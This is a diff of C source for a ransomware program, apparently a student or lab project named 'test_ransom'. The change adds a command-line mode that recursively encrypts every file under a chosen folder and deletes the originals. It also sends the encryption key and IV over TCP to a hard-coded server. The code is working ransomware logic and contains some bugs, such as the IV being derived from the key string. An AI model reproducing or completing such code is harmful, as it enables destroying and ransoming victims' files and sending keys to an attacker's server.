@@ -16,13 +16,39 @@
 #define SIZE 1024
 
 void usage();
-int is_encrypted(char *filename);
+int is_encrypted(char *path);
 void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
 int send_key(char *pKey, char *pIv);
-int recv_key(int, struct sockaddr_in server_address);
 
-int is_encrypted(char *filename){
+void usage(void){
+    printf("Options :\n\n");
+    printf("    -h          Display the help of the software.\n");
+    printf("    -c          Execute the software in encryption mode.\n");
+    printf("                It'll generate a key and iv that'll be sent\n");
+	printf("                automatically to the server. This command must\n");
+	printf("                be followed by -f.\n");
+	printf("    -d          Execute the software in decryption mode.\n");
+	printf("                This command must be followed in order by -f, \n");
+	printf("                -k and -v arguments.\n");
+    printf("    -f          Must be after -c or -d, must be followed by the\n");
+    printf("                start folder of the tree to encrypt or decrypt.\n");
+	printf("    -k          Must be after -a and his address, must be\n");
+    printf("                followed by the right key.\n");
+    printf("    -v          Must be after -k and his key, must be\n");
+    printf("                followed by the right initialisation vector.\n\n");
+
+    printf("exemples of encrypting :\n\n");
+    printf("    -c -f {root folder of the tree}\n\n");
+
+    printf("exemples of listening :\n\n");
+    printf("    -d -f {root folder of the tree} -k {key} -v {initialisation vector}\n\n");
+}
+
+int is_encrypted(char *path){
+	char filename[strlen(path)];
+	
+	strcpy(filename, path);
 	char *token = strtok(filename, ".");
 
 	while(token != NULL){
@@ -39,22 +65,15 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 	struct dirent *entry;
 
 	char path[1024];//taille arbitraire
-
 	dir = opendir(name);
-	if(dir == NULL){
-		printf("resultat NULL\n");
-		return;
-	}
 
 	if(de_flag == 't'){
 		printf("INFO:LIST_DIR_ENCRYPTING] : Software in testing mod\n");
 		return;
 	}
 
-	//dessiner bout de code de récurtion (sous forme d'arbre)
 	while((entry = readdir(dir)) != NULL){
 		snprintf(path, sizeof(path), "%s/%s", name, entry -> d_name);
-		printf("%s\n", path);
 
 		if(entry -> d_type == DT_DIR){
 			if(strcmp(entry -> d_name, ".") == 0 || strcmp(entry -> d_name, "..") == 0){
@@ -62,19 +81,28 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 			}
 			listdir(path, iv, key, de_flag);
 		}
+		//If file and not dir
 		else{
-			if(de_flag == 'e'){
+			if(de_flag == 'c'){
 				if(is_encrypted(path) == 1){
+					printf("%s\n", path);
 					continue;
 				}
 				encrypt(key, iv, path);
 				remove(path);
 			}
 			else if(de_flag == 'd'){
+				unsigned char key_binary[strlen(key) * 2];
+				unsigned char iv_binary[strlen(iv) * 2];
+
+				hexa_to_bytes(key, key_binary, (strlen(key) * 2));
+				hexa_to_bytes(key, iv_binary, (strlen(iv) * 2));
+
 				if(is_encrypted(path) == 0){
 					continue;
 				}
-				decrypt(key, iv, path);
+				printf("%s\n", path);
+				decrypt(key_binary, iv_binary, path);
 				remove(path);
 			}
 			else{
@@ -105,34 +133,20 @@ int send_key(char *pKey, char *pIv){
 	int server_port = 8888;
 	char *server_ip = "192.168.1.4";
 
-	sockid = socket(AF_INET, SOCK_DGRAM, 0);
+	sockid = socket(AF_INET, SOCK_STREAM, 0);
 
 	struct sockaddr_in server_addr;
 	server_addr.sin_family = AF_INET;
 	server_addr.sin_port = htons(server_port);
 	server_addr.sin_addr.s_addr = inet_addr(server_ip);
 
-	int bind_result = bind(sockid, (struct sockaddr *) &server_addr, sizeof(server_addr));
-
 	char msg[((OPENSSL_KEY_SIZE * 2) + (OPENSSL_IV_SIZE * 2) + 3)];
 	snprintf(msg, sizeof(msg), "%s | %s", pKey, pIv);
 
-	sendto(sockid, (const char *)msg, strlen(msg), 0, (const struct sockaddr *) &server_addr, sizeof(server_addr));
-	
-	recv_key(sockid, server_addr);
-}
+	connect(sockid, (struct sockaddr *)&server_addr, sizeof(server_addr));
+	printf("Connected on %s:%d\n", inet_ntoa(server_addr.sin_addr), server_addr.sin_port);
 
-int recv_key(int sockid, struct sockaddr_in server_addr){
-	int len = sizeof(server_addr);
-	char *buffer[SIZE];
-
-	printf("%s\n", inet_ntoa(server_addr.sin_addr));
-	printf("%d\n", server_addr.sin_port);
-
-	recvfrom(sockid, (char *)buffer, SIZE, MSG_WAITALL, (struct sockaddr *) &server_addr, &len);
-	printf("%s\n", buffer);
-
-	close(sockid);
+	send(sockid, (const char *)msg, strlen(msg), 0);
 }
 
 int main (int argc, char * argv[]){
@@ -143,8 +157,44 @@ int main (int argc, char * argv[]){
 	char pIv[(OPENSSL_IV_SIZE * 2) + 1];
 
 	const char *name = "test_ransom";
-	char de_flag = 't';
 
-	generate_key(key, OPENSSL_KEY_SIZE, iv, OPENSSL_IV_SIZE, pKey, pIv);
-	listdir(name, iv, key, de_flag);
+	//possible actions
+    if(argc > 1){
+        if(strcmp(argv[1], "-c") == 0){
+            if(strcmp(argv[2], "-f") == 0){
+				generate_key(key, OPENSSL_KEY_SIZE, iv, OPENSSL_IV_SIZE, pKey, pIv);
+				listdir(argv[3], iv, key, 'c');
+			}
+			else{
+				printf("Argument is missing !");
+			}
+        }
+        else if(strcmp(argv[1], "-d") == 0){
+            if(strcmp(argv[2], "-f") == 0){
+				if(strcmp(argv[4], "-k") == 0){
+					if(strcmp(argv[6], "-v") == 0){
+						listdir(argv[3], argv[7], argv[5], 'd');
+					}
+					else{
+						printf("Argument is missing !");
+					}
+				}
+				else{
+					printf("Argument is missing !");
+				}
+			}
+			else{
+				printf("Argument is missing !");
+			}
+        }
+        else if(strcmp(argv[1], "-h") == 0){
+            usage();
+        }
+        else{
+            printf("wrong argument gived !\n");
+        }
+    }
+    else{
+        printf("non argument gived !\n");
+    }
 }
